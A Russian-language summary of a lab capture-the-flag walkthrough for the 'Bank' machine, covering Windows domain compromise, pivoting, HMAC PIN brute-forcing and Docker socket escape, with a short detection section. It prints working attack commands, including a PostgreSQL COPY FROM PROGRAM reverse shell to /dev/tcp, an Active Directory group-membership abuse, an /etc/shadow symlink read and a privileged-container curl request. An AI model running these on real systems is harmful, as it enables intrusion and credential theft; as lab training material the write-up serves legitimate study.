# Bank: перебор PIN-кода, пивотинг и выход из контейнера через docker.sock

**Таск:** Bank (aclabs.pro, сложный, 2 машины, 6 флагов; сезон в источнике не указан)
**Источник:** [разбор seobuster на Хабре](https://habr.com/ru/articles/1085490). Ниже — конспект этого прохождения.
**Цепочка:** скрытый файл → WinRM → GenericWrite на группу → чтение файлов с SeBackupPrivilege → ligolo → перебор PIN-кода как ключа HMAC → бэкдор ProFTPD → COPY FROM PROGRAM → SUID → docker.sock.

## Первоначальный доступ (Windows)

Контроллер домена с IIS: открыты 53, 80, 88, 445, LDAP и 5985. Домен `bank.acl`. В исходном коде сайта упоминается каталог `employees`. Счётчик файлов показывает, что каталог не пуст, но в списке ничего нет. В разборе скрытые файлы ищутся по префиксу с точкой:

```bash
ffuf -u http://<ip>/employees/.FUZZ -w directory-list-2.3-medium.txt -ic -c -e .txt
```

В браузере у `script.txt` неверно отображается кириллица; автор сохраняет его через curl. Внутри — учётные данные `web-srv`, закодированные в Base64. Они подходят для входа через evil-winrm. Первый флаг находится на рабочем столе пользователя.

## Повышение привилегий: GenericWrite

Данные SharpHound показывают право GenericWrite на группу Server Operators. После добавления `web-srv` в группу и повторного входа становятся доступны привилегии резервного копирования и восстановления:

```powershell
Add-ADGroupMember -Identity "Server Operators" -Members "web-srv"
robocopy /b C:\Users\Administrator\Desktop C:\Users\web-srv\Desktop /E
```

`/b` включает режим резервного копирования: SeBackupPrivilege позволяет читать файлы независимо от их обычных разрешений. Так автор получает флаг с рабочего стола Administrator.

## Пивотинг и PIN-код

Второй сетевой адаптер подключён к 10.10.20.0/24. PowerShell-скрипт с TcpClient находит хост 10.10.20.227. Для доступа к нему используется туннель ligolo, а `listener_add` — для обратных подключений.

В веб-приложении «хранилища» cookie `vault-signature` содержит HMAC-SHA256. Ключ — восьмизначный PIN-код, сообщение постоянно. Это позволяет перебрать кандидаты локально, сравнивая вычисленную подпись с известной:

```python
sig = hmac.new(f"{i:08d}".encode(), b"Vault7", hashlib.sha256).hexdigest()
```

После нахождения PIN-кода открывается хранилище. На Linux-хосте становятся доступны порты 21 (ProFTPD), 80 и 5432.

## ProFTPD и SUID

Бэкдор в ProFTPD позволяет выполнить команду до аутентификации и создать пользователя backdoor с uid=0. В `/etc/proftpd/proftpd.conf` находятся учётные данные суперпользователя PostgreSQL. Через COPY FROM PROGRAM автор получает обратную оболочку:

```sql
COPY shell FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/<ip>/4444 0>&1"';
```

В исходном разборе файл, переданный через PostgreSQL, оказался повреждён: MD5 не совпал. После передачи через curl и uploadserver контрольная сумма совпала. Этот эпизод полезен как напоминание проверять целостность файлов после передачи.

`find -perm /4000` обнаруживает нестандартный `/usr/bin/cati`. Анализ в Ghidra показывает вызов setuid(0) и чтение `/var/www/html/input`. Символическая ссылка на `/etc/shadow` позволяет получить хэш пароля; после его подбора автор получает root в контейнере.

## docker.sock

В контейнере доступен `/var/run/docker.sock`. Через Docker API автор создаёт привилегированный контейнер с подключённой файловой системой хоста. В заметке сохранён исходный пример запроса; его формат требует отдельной проверки по Docker API:

```bash
curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/create \
  -d '{"Image":"alpine","Cmd":["cat","var/tmp/root/root.txt"],"Binds":["/:/var/tmp"],"Privileged":true}'
```

После запуска контейнера финальный флаг читается из его логов.

## Как обнаружить

При включённом Audit Security Group Management добавление участника в Server Operators фиксируется событием Windows 4732. Важно проверять целевую группу и инициатора изменения. Локальный перебор PIN-кода не создаёт тысячи запросов к серверу: его ищут вне приложения по известной подписи. Доступность Docker socket из контейнера проверяется аудитом конфигурации; действия через API можно отслеживать, если настроен сбор соответствующей телеметрии.

## Заметка

Server Operators даёт существенные права на контроллере домена, даже если учётная запись не входит в Domain Admins. В этой цепочке SeBackupPrivilege используется через штатный `robocopy /b`, без отдельного инструмента для чтения защищённых файлов.
